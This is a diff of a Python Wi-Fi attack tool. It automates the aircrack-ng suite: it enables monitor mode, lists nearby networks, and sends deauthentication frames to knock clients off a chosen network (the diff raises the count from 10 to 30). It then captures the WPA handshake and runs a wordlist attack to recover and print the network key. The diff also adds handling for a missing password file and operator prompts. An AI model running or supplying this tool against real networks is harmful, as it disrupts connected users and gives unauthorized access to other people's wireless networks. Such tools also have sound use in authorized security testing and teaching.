@@ -90,7 +90,7 @@ class Capture:
         return (BSSID, ESSID, CH)
 
     def deauth(self, bssid):
-        cmd = f"sudo xterm -e /bin/bash -c -l 'aireplay-ng --deauth 10 -a {bssid} {self.iface}'"
+        cmd = f"sudo xterm -e /bin/bash -c -l 'aireplay-ng --deauth 30 -a {bssid} {self.iface}'"
         os.system(cmd)
 
     def monHandshake(self, bssid, channel):
@@ -123,11 +123,17 @@ class Cracker:
         crack_cmd = f"xterm -e /bin/bash -c -l 'aircrack-ng {handshake_file} -w {self.wordlist} -l ./tmp/password'"
         os.system(crack_cmd)
 
-        passF = open("./tmp/password", "r")
-        password = passF.read()
-        passF.close()
+        if "./tmp/password" in glob.glob("./tmp/password"):
+            passF = open("./tmp/password", "r")
+            password = passF.read()
+            passF.close()
 
-        return password
+            os.remove("./tmp/password")
+
+            return password
+
+        else:
+            return None
 
 
 def runner(interface, wordlist):
@@ -138,17 +144,19 @@ def runner(interface, wordlist):
     monitor_mode = ifacectrl.enableMonitorMode()
     if monitor_mode:
         print("[+] Monitor Mode Enabled")
+        print("Press Ctrl+C when you see the ESSID of the network in the XTERM window\n\n")
         net_df = capture.captureNetwork()
         print(net_df)
 
-        index = int(input("\n\nEnter ESSID Index >> "))
+        index = int(input("\nEnter ESSID Index >> "))
         bssid, essid, channel = capture.extractInfo(index=index, networkDF=net_df)
 
+        print("\n\nPress Ctrl+C when you see WPA")
         capture.grabCAP(bssid=bssid, channel=channel)
 
         password = cracker.aircrack()
         if password:
-            print("\n[+] KEY FOUND : ", password)
+            print(f"\n[+] KEY FOUND : {password}\n\n")
 
         else:
             print("\n[-] Sorry, Unable to find the key!")
